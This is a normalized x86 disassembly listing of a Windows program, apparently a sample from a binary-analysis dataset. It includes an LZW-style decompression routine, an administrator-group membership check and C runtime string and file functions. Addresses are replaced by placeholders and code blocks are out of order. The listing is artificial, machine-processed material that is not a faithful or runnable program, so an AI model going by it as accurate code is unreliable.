sub_2001000
sub esp 0x18
call sub_2001070
test eax eax
jl r-xdata
or eax 0xffffffff
add esp 0x18
retn
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp ] edx
lea edx [ esp ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] ecx
mov ecx [ esi ]
push edx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0xc ] ecx
call sub_2001120
add esp 0x8
test eax eax
jge r-xdata
call sub_20010d0
mov ecx [ esp + 0x8 ]
mov [ esi ] ecx
xor eax eax
add esp 0x18
retn
call sub_20010d0
sub_2001070
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
push 0x4e74
call sub_200178d
mov esi eax
push 0x4e74
mov [ rw-data ] esi
call sub_200178d
mov edi eax
push 0x139d
mov [ rw-data ] edi
call sub_200178d
add esp 0xc
mov [ rw-data ] eax
test esi esi
je r-xdata
xor eax eax
retn
pop edi
or eax 0xffffffff
pop esi
retn
test edi edi
je r-xdata
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_20010d0
mov eax [ rw-data ]
push eax
call sub_20016b0
mov ecx [ rw-data ]
push ecx
call sub_20016b0
mov edx [ rw-data ]
push edx
call sub_20016b0
xor eax eax
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_2001120
sub esp 0x14
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x28 ]
mov [ esp + 0x14 ] 0x100
call sub_20012c0
mov ecx [ esp + 0x2c ]
mov edx eax
mov eax [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] eax
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] edx
jle r-xdata
call sub_2001070
call sub_20012c0
mov edi eax
mov [ esp + 0x1c ] edi
cmp edi 0xfff
je r-xdata
mov esi [ ecx ]
mov [ eax + esi ] dl
inc eax
mov [ ecx + 0x8 ] eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ebp [ rw-data ]
mov ebx [ rw-data ]
mov ecx edi
mov edx rw-data
cmp edi 0xff
jbe r-xdata
mov ecx [ esp + 0x18 ]
mov al [ esp + 0x10 ]
mov [ rw-data ] al
mov edx rw-data
cmp ecx 0xff
jbe r-xdata
mov [ edx ] cl
movzx ecx [ edx ]
mov [ esp + 0x10 ] ecx
cmp edx rw-data
jb r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
lea ebx [ ebx ]
mov eax [ esp + 0x14 ]
cmp eax 0xffe
ja r-xdata
mov eax [ esp + 0x2c ]
mov esi [ eax + 0x4 ]
lea esp [ esp ]
push r--data
call sub_2002da0
add esp 0x4
push 0xfffffffd
call sub_2003105
cmp ecx 0xff
ja r-xdata
cmp ecx 0xff
ja r-xdata
mov [ esp + 0x18 ] edi
mov edi [ esp + 0x28 ]
call sub_20012c0
mov edi eax
mov [ esp + 0x1c ] eax
cmp edi 0xfff
jne r-xdata
mov ecx [ esp + 0x18 ]
mov dl [ esp + 0x10 ]
mov [ ebp + eax * 4 ] ecx
mov [ ebx + eax ] dl
inc eax
mov [ esp + 0x14 ] eax
mov eax [ eax ]
mov edi [ esp + 0x1c ]
mov [ esp + 0x20 ] edx
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
inc ecx
mov [ eax + 0x8 ] ecx
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
mov al [ ebx + ecx ]
mov ecx [ ebp + ecx * 4 ]
mov [ edx ] al
mov eax esi
inc edx
inc esi
cmp eax 0xffe
jge r-xdata
jmp r-xdata
xor esi esi
cmp edi [ esp + 0x14 ]
jb r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x14
retn
cmp edx rw-data
jae r-xdata
dec edx
test ecx ecx
jl r-xdata
mov ecx [ eax + 0x8 ]
cmp esi ecx
jg r-xdata
sub_20012c0
mov edx [ rw-data ]
cmp edx 0x18
push ebx
mov ebx [ rw-data ]
jg r-xdata
mov eax ebx
shl ebx 0xc
sub edx 0xc
mov [ rw-data ] ebx
shr eax 0x14
mov [ rw-data ] edx
pop ebx
retn
push ebp
mov ebp [ edi + 0x4 ]
push esi
mov esi [ edi + 0x8 ]
lea ebx [ ebx ]
mov eax [ edi ]
movzx eax [ eax + esi ]
inc esi
or eax 0xffffffff
jmp r-xdata
cmp ebp esi
jg r-xdata
mov [ edi + 0x8 ] esi
pop esi
pop ebp
mov ecx 0x18
sub ecx edx
shl eax cl
add edx 0x8
or ebx eax
cmp edx 0x18
jle r-xdata
sub_2001330
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push ebx
xor ebx ebx
lea eax [ esp + 0x8 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] 0x5
call [ AllocateAndInitializeSid@IAT ]
mov [ esp + 0x4 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
pop ebx
xor ecx esp
call sub_2002d91
add esp 0x14
retn
mov eax [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
push ecx
call [ FreeSid@IAT ]
mov eax [ esp + 0x4 ]
mov [ esp + 0x4 ] ebx
sub_20013e0
mov eax ebx
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
sub eax edx
mov ecx ebx
push edi
lea eax [ eax + ebx - 0x1 ]
mov esi 0x1
lea edi [ ecx + 0x1 ]
mov edi edi
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp ecx 0x1
jle r-xdata
pop edi
pop esi
retn
mov edi edi
inc eax
mov ecx ebx
dec eax
inc esi
lea edi [ ecx + 0x1 ]
lea esp [ esp ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
cmp esi ecx
jl r-xdata
cmp [ eax ] 0x5c
je r-xdata
pop edi
pop esi
retn
sub_200144c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_2004244
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_2003f07
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_200379b
mov [ esi + 0x4 ] eax
sub_20014d3
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_200150c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_200144c
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
push edi
push [ ebp + 0x8 ]
call sub_20014d3
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub esi eax
mov eax esi
pop esi
cmp esi eax
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200451a
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_200451a
add esp 0x10
inc edi
cmp esi ebx
je r-xdata
sub_20015e1
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200150c
add esp 0xc
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
pop esi
pop ebp
jmp sub_20014d3
pop esi
pop ebp
retn
sub_2001633
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_2004a21
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_2004817
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_20016b0
push 0xc
push r--data
call sub_200625c
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_20062a1
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_2005798
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_20047ce
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_200478c
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2001706
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_20057c8
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_200173e
push 0xc
push r--data
call sub_200625c
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_20062a1
retn
push 0x4
call sub_2005765
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_2005f77
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2001784
sub_200178d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_200663f
pop ecx
call sub_20047ce
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_20065f7
push 0x1e
call sub_200644c
push 0xff
call sub_2002ee9
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_200173e
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_20047ce
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_200663f
pop ecx
test eax eax
je r-xdata
call sub_20047ce
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_2001860
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_2006686
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
add esi 0x1
cmp al dl
je r-xdata
mov al [ esi ]
add esi 0x1
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
add esi 0x1
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
sub_2001910
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_2001a34
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x2c ] eax
call sub_2004244
push 0x8
pop ecx
mov [ ebp - 0x28 ] eax
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax + 0x18 ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
pop edi
and eax ebx
pop esi
xor ecx ebp
pop ebx
call sub_2002d91
leave
retn
sub_2001af5
push 0xc
push r--data
call sub_200625c
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_20047ce
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2004766
add esp 0x14
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_20062a1
retn
call sub_2006e16
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_20047ce
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_2006b4d
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2001baf
mov eax [ ebp - 0x1c ]
call sub_20047ce
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_2006f50
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_2001bd0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_20047ce
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_2007940
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_20070a3
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_20047ce
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_2007940
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_200788d
pop ecx
push eax
call sub_2007790
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_20078bf
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_2004766
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_20047ce
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_2007940
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_2001dda
push 0xc
push r--data
call sub_200625c
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_2006a6f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2001bd0
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2001e66
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_20062a1
retn
call sub_20047ce
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_2007940
add esp 0xc
sub_2001ec1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_20047ce
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_20047ce
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2004766
add esp 0x14
mov eax esi
jmp r-xdata
sub_2001f29
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_20047ce
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_2004817
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_200319d
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_200788d
pop ecx
push eax
call sub_20080ed
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_20081d0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_200208b
push 0xc
push r--data
call sub_200625c
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_2006a6f
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2001f29
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2002103
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_20047ce
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
call sub_20062a1
retn
sub_2002110
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_200213d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_200144c
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
